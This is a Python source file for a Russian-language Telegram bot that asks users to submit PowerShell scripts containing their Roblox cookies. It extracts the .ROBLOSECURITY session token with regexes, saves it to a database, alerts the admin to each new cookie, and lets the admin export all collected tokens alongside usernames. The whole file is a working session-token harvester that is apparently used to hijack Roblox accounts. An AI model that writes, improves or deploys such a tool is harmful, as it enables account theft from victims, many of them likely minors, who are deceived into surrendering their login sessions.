import re
import logging
import asyncio
import sys
import traceback
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    ContextTypes, filters, CallbackQueryHandler
)

from config import Config
from database import Database

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    stream=sys.stdout  # Важно для Render!
)
logger = logging.getLogger(__name__)

class RobloxCookieBot:
    def __init__(self):
        logger.info("=" * 50)
        logger.info("🤖 СОЗДАНИЕ ЭКЗЕМПЛЯРА БОТА")
        logger.info("=" * 50)
        
        try:
            self.config = Config()
            logger.info(f"✅ Config загружен")
            logger.info(f"   Токен: {self.config.BOT_TOKEN[:10]}...")
            logger.info(f"   Админ ID: {self.config.ADMIN_ID}")
            logger.info(f"   Длина токена: {len(self.config.BOT_TOKEN)}")
        except Exception as e:
            logger.error(f"❌ Ошибка загрузки Config: {e}")
            raise
        
        try:
            self.db = Database(self.config.DB_PATH)
            logger.info(f"✅ База данных инициализирована")
        except Exception as e:
            logger.error(f"❌ Ошибка базы данных: {e}")
            raise
        
        try:
            self.app = Application.builder().token(self.config.BOT_TOKEN).build()
            logger.info("✅ Application создан")
        except Exception as e:
            logger.error(f"❌ Ошибка создания Application: {e}")
            raise
        
        # Регистрация обработчиков
        self.setup_handlers()
        logger.info("✅ Обработчики зарегистрированы")
    
    def setup_handlers(self):
        # Команды
        self.app.add_handler(CommandHandler("start", self.start_command))
        self.app.add_handler(CommandHandler("help", self.help_command))
        self.app.add_handler(CommandHandler("mycookies", self.my_cookies_command))
        
        # Админ команды
        self.app.add_handler(CommandHandler("stats", self.stats_command))
        self.app.add_handler(CommandHandler("users", self.users_command))
        self.app.add_handler(CommandHandler("broadcast", self.broadcast_command))
        self.app.add_handler(CommandHandler("delete", self.delete_command))
        self.app.add_handler(CommandHandler("export", self.export_command))
        
        # Обработка текстовых сообщений
        self.app.add_handler(MessageHandler(
            filters.TEXT & ~filters.COMMAND, 
            self.handle_text_message
        ))
        
        # Обработка документов
        self.app.add_handler(MessageHandler(
            filters.Document.ALL, 
            self.handle_document
        ))
        
        # Callback queries
        self.app.add_handler(CallbackQueryHandler(self.handle_callback))
    
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        logger.info(f"👤 Команда /start от {user.id} (@{user.username})")
        
        # Добавляем пользователя в базу
        self.db.add_user(
            user_id=user.id,
            username=user.username,
            first_name=user.first_name,
            last_name=user.last_name or ""
        )
        
        # Отправляем приветственное сообщение
        await update.message.reply_text(
            self.config.WELCOME_MESSAGE,
            parse_mode='Markdown'
        )
        
        # Если это админ, показываем админ-команды
        if user.id == self.config.ADMIN_ID:
            await update.message.reply_text(
                self.config.ADMIN_COMMANDS,
                parse_mode='Markdown'
            )
    
    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        logger.info(f"🆘 Команда /help от {update.effective_user.id}")
        await update.message.reply_text(
            "Просто отправьте мне PowerShell скрипт с куки Roblox.\n"
            "Я автоматически извлеку .ROBLOSECURITY куки и сохраню их.",
            parse_mode='Markdown'
        )
    
    def extract_roblox_cookie(self, text: str) -> str:
        """
        Извлекает .ROBLOSECURITY куки из PowerShell скрипта
        """
        logger.info(f"🔍 Извлечение куки из текста ({len(text)} символов)")
        
        # Паттерн для поиска .ROBLOSECURITY куки
        patterns = [
            r'\.ROBLOSECURITY["\']?\s*,\s*["\']([^"\']+)["\']',
            r'\.ROBLOSECURITY["\']?\s*,\s*["\'](.*?_\|WARNING:.*?)\s*["\']',
            r'\.ROBLOSECURITY.*?["\'](.*?_\|WARNING:.*?)["\']',
            r'["\']\.ROBLOSECURITY["\'].*?["\'](.*?)["\']'
        ]
        
        for i, pattern in enumerate(patterns):
            matches = re.search(pattern, text, re.DOTALL)
            if matches:
                cookie = matches.group(1).strip()
                logger.info(f"✅ Куки найден (паттерн {i+1}), длина: {len(cookie)}")
                return cookie
        
        logger.warning("❌ Куки не найден в тексте")
        return ""
    
    async def handle_text_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        text = update.message.text
        logger.info(f"📩 Сообщение от {user.id} ({len(text)} символов)")
        
        # Обновляем активность пользователя
        self.db.update_user_activity(user.id)
        
        # Пытаемся извлечь куки из текста
        cookie = self.extract_roblox_cookie(text)
        
        if cookie:
            # Сохраняем куки в базу
            self.db.save_cookie(user.id, cookie)
            logger.info(f"💾 Куки сохранен в БД для пользователя {user.id}")
            
            # Отправляем подтверждение
            await update.message.reply_text(
                self.config.COOKIE_EXTRACTED.format(
                    user_id=user.id,
                    time=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                ),
                parse_mode='Markdown'
            )
            
            # Уведомляем админа
            if self.config.ADMIN_ID and self.config.ADMIN_ID != user.id:
                try:
                    await context.bot.send_message(
                        chat_id=self.config.ADMIN_ID,
                        text=f"📥 Новый куки от @{user.username or user.id}\n"
                             f"👤 ID: {user.id}\n"
                             f"📏 Длина: {len(cookie)} символов\n"
                             f"🕒 Время: {datetime.now().strftime('%H:%M:%S')}"
                    )
                    logger.info(f"📨 Уведомление отправлено админу {self.config.ADMIN_ID}")
                except Exception as e:
                    logger.error(f"❌ Не удалось уведомить админа: {e}")
        else:
            await update.message.reply_text(
                "❌ *Не удалось найти .ROBLOSECURITY куки в тексте.*\n\n"
                "Убедитесь, что вы отправили полный PowerShell скрипт с командой Invoke-WebRequest.",
                parse_mode='Markdown'
            )
    
    async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Обработка документов (если пользователь отправляет файл)"""
        document = update.message.document
        user = update.effective_user
        logger.info(f"📎 Документ от {user.id}: {document.file_name}")
        
        if document.file_name and (document.file_name.endswith('.txt') or document.file_name.endswith('.ps1')):
            # Скачиваем файл
            file = await document.get_file()
            file_content = await file.download_as_bytearray()
            text = file_content.decode('utf-8')
            
            # Извлекаем куки
            cookie = self.extract_roblox_cookie(text)
            
            if cookie:
                self.db.save_cookie(user.id, cookie)
                logger.info(f"💾 Куки из файла сохранен для {user.id}")
                
                await update.message.reply_text(
                    self.config.COOKIE_EXTRACTED.format(
                        user_id=user.id,
                        time=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    ),
                    parse_mode='Markdown'
                )
            else:
                await update.message.reply_text(
                    "❌ Не удалось извлечь куки из файла.",
                    parse_mode='Markdown'
                )
        else:
            await update.message.reply_text(
                "❌ Пожалуйста, отправьте .txt или .ps1 файл с PowerShell скриптом."
            )
    
    async def my_cookies_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Показать куки пользователя"""
        user = update.effective_user
        logger.info(f"📁 Команда /mycookies от {user.id}")
        
        cookies = self.db.get_user_cookies(user.id)
        
        if not cookies:
            await update.message.reply_text(
                "📭 У вас еще нет сохраненных куки.",
                parse_mode='Markdown'
            )
            return
        
        message = f"📁 *Ваши куки ({len(cookies)}):*\n\n"
        
        for i, cookie_data in enumerate(cookies[:5], 1):
            cookie_preview = cookie_data['cookie'][:50] + "..." if len(cookie_data['cookie']) > 50 else cookie_data['cookie']
            message += f"{i}. `{cookie_preview}`\n"
            message += f"   ⏰ {cookie_data['time']}\n\n"
        
        if len(cookies) > 5:
            message += f"... и еще {len(cookies) - 5} куки"
        
        await update.message.reply_text(message, parse_mode='Markdown')
    
    # АДМИН КОМАНДЫ
    
    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Статистика бота"""
        user = update.effective_user
        logger.info(f"📊 Команда /stats от {user.id}")
        
        if user.id != self.config.ADMIN_ID:
            await update.message.reply_text("❌ У вас нет прав доступа.")
            return
        
        stats = self.db.get_stats()
        
        message = (
            "📊 *Статистика бота:*\n\n"
            f"👥 Всего пользователей: `{stats['total_users']}`\n"
            f"🍪 Всего куки: `{stats['total_cookies']}`\n"
            f"👤 Пользователей с куки: `{stats['users_with_cookies']}`\n"
            f"📈 Среднее куки на пользователя: `{stats['avg_cookies_per_user']:.2f}`\n"
        )
        
        await update.message.reply_text(message, parse_mode='Markdown')
    
    async def users_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Список пользователей"""
        user = update.effective_user
        logger.info(f"👥 Команда /users от {user.id}")
        
        if user.id != self.config.ADMIN_ID:
            await update.message.reply_text("❌ У вас нет прав доступа.")
            return
        
        users = self.db.get_all_users()
        
        if not users:
            await update.message.reply_text("📭 В базе нет пользователей.")
            return
        
        message = f"👥 *Список пользователей ({len(users)}):*\n\n"
        
        for user_data in users[:20]:
            message += (
                f"🆔 ID: `{user_data['user_id']}`\n"
                f"👤 Имя: {user_data['first_name']}\n"
                f"📛 Юзернейм: @{user_data['username'] or 'нет'}\n"
                f"🍪 Куки: {user_data['cookie_count']}\n"
                f"📅 Регистрация: {user_data['registered_at']}\n"
                f"🕒 Активность: {user_data['last_activity']}\n"
                f"────────────────────\n"
            )
        
        if len(users) > 20:
            message += f"\n... и еще {len(users) - 20} пользователей"
        
        await update.message.reply_text(message, parse_mode='Markdown')
    
    async def broadcast_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Рассылка сообщений"""
        user = update.effective_user
        logger.info(f"📢 Команда /broadcast от {user.id}")
        
        if user.id != self.config.ADMIN_ID:
            await update.message.reply_text("❌ У вас нет прав доступа.")
            return
        
        if not context.args:
            await update.message.reply_text(
                "📢 *Использование:* /broadcast <текст сообщения>\n\n"
                "Пример: /broadcast Привет всем пользователям!",
                parse_mode='Markdown'
            )
            return
        
        message_text = ' '.join(context.args)
        users = self.db.get_all_users()
        
        await update.message.reply_text(
            f"🔄 Начинаю рассылку для {len(users)} пользователей..."
        )
        
        success = 0
        failed = 0
        
        for user_data in users:
            try:
                await context.bot.send_message(
                    chat_id=user_data['user_id'],
                    text=f"📢 *Сообщение от администратора:*\n\n{message_text}",
                    parse_mode='Markdown'
                )
                success += 1
                await asyncio.sleep(0.1)
            except Exception as e:
                logger.error(f"Не удалось отправить {user_data['user_id']}: {e}")
                failed += 1
        
        await update.message.reply_text(
            f"✅ *Рассылка завершена:*\n\n"
            f"✅ Успешно: {success}\n"
            f"❌ Не удалось: {failed}",
            parse_mode='Markdown'
        )
    
    async def delete_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Удалить пользователя"""
        user = update.effective_user
        logger.info(f"🗑️ Команда /delete от {user.id}")
        
        if user.id != self.config.ADMIN_ID:
            await update.message.reply_text("❌ У вас нет прав доступа.")
            return
        
        if not context.args:
            await update.message.reply_text(
                "🗑️ *Использование:* /delete <user_id>\n\n"
                "Пример: /delete 123456789",
                parse_mode='Markdown'
            )
            return
        
        try:
            user_id = int(context.args[0])
            success = self.db.delete_user(user_id)
            
            if success:
                logger.info(f"✅ Пользователь {user_id} удален")
                await update.message.reply_text(
                    f"✅ Пользователь `{user_id}` удален.",
                    parse_mode='Markdown'
                )
            else:
                logger.warning(f"⚠️ Пользователь {user_id} не найден")
                await update.message.reply_text(
                    f"❌ Пользователь `{user_id}` не найден.",
                    parse_mode='Markdown'
                )
        except ValueError:
            await update.message.reply_text("❌ Неверный ID пользователя.")
    
    async def export_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Экспорт всех куки"""
        user = update.effective_user
        logger.info(f"📥 Команда /export от {user.id}")
        
        if user.id != self.config.ADMIN_ID:
            await update.message.reply_text("❌ У вас нет прав доступа.")
            return
        
        cookies = self.db.get_all_cookies()
        
        if not cookies:
            await update.message.reply_text("📭 Нет сохраненных куки.")
            return
        
        # Создаем текстовый файл
        export_text = f"# Экспорт куки Roblox\n"
        export_text += f"# Дата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        export_text += f"# Всего куки: {len(cookies)}\n\n"
        
        for cookie in cookies:
            export_text += f"🔸 Куки #{cookie['user_id']}\n"
            export_text += f"👤 Пользователь: @{cookie['username'] or 'нет'} (ID: {cookie['user_id']})\n"
            export_text += f"🕒 Дата: {cookie['extracted_at']}\n"
            export_text += f"🔐 Cookie: {cookie['cookie']}\n"
            export_text += "─" * 50 + "\n\n"
        
        # Сохраняем временный файл
        filename = f"cookies_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(export_text)
        
        # Отправляем файл
        with open(filename, 'rb') as f:
            await update.message.reply_document(
                document=f,
                filename=filename,
                caption=f"📤 Экспортировано {len(cookies)} куки"
            )
        
        logger.info(f"✅ Экспортировано {len(cookies)} куки в файл {filename}")
    
    async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Обработка callback запросов"""
        query = update.callback_query
        await query.answer()
        logger.info(f"🔘 Callback: {query.data}")
        await query.edit_message_text(text=f"Выбрано: {query.data}")
    
    def run(self):
        """Запуск бота"""
        logger.info("=" * 50)
        logger.info("🚀 ЗАПУСК БОТА TELEGRAM")
        logger.info("=" * 50)
        
        logger.info(f"🤖 Токен: {self.config.BOT_TOKEN[:10]}...")
        logger.info(f"👑 Админ ID: {self.config.ADMIN_ID}")
        logger.info(f"📏 Длина токена: {len(self.config.BOT_TOKEN)}")
        
        try:
            logger.info("🔄 Запускаем polling...")
            self.app.run_polling(
                allowed_updates=Update.ALL_TYPES,
                drop_pending_updates=True,
                close_loop=False
            )
        except KeyboardInterrupt:
            logger.info("\n👋 Бот остановлен пользователем")
        except Exception as e:
            logger.error(f"❌ КРИТИЧЕСКАЯ ОШИБКА: {e}")
            logger.error(traceback.format_exc())
            raise

if __name__ == '__main__':
    logger.info("=" * 50)
    logger.info("🤖 СКРИПТ БОТА ЗАПУЩЕН НАПРЯМУЮ")
    logger.info("=" * 50)
    
    try:
        bot = RobloxCookieBot()
        bot.run()
    except Exception as e:
        logger.error(f"❌ ФАТАЛЬНАЯ ОШИБКА: {e}")
        logger.error(traceback.format_exc())
        sys.exit(1)
